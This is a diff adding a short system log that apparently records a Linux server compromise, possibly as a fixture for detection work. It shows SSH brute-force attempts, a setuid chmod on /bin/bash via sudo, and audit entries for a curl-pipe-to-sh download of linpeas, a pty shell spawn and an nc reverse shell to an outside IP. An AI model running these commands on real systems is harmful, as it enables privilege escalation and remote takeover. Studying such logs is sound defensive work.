@@ -1,0 +1,10 @@
+Oct 22 10:01:11 bastion-01 sshd[1021]: Failed password for invalid user admin from 185.220.101.14 port 44120 ssh2
+Oct 22 10:01:14 bastion-01 sshd[1023]: Failed password for invalid user oracle from 185.220.101.14 port 44128 ssh2
+Oct 22 10:01:19 bastion-01 sshd[1025]: Failed password for root from 185.220.101.14 port 44135 ssh2
+Oct 22 10:02:05 bastion-01 sshd[1040]: Failed password for deploy from 198.51.100.77 port 52910 ssh2
+Oct 22 10:04:32 app-srv-02 sudo[2190]: deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/apt-get update
+Oct 22 10:05:10 app-srv-02 sudo[2204]: www-data : TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/chmod 4755 /bin/bash
+type=EXECVE msg=audit(1729591550.412:801): argc=3 a0="/bin/bash" a1="-c" a2="curl -fsSL http://198.51.100.77/linpeas.sh | sh"
+type=EXECVE msg=audit(1729591588.905:802): argc=3 a0="python3" a1="-c" a2="import pty; pty.spawn('/bin/sh')"
+type=EXECVE msg=audit(1729591620.118:803): argc=4 a0="nc" a1="-e" a2="/bin/bash" a3="198.51.100.77"
+
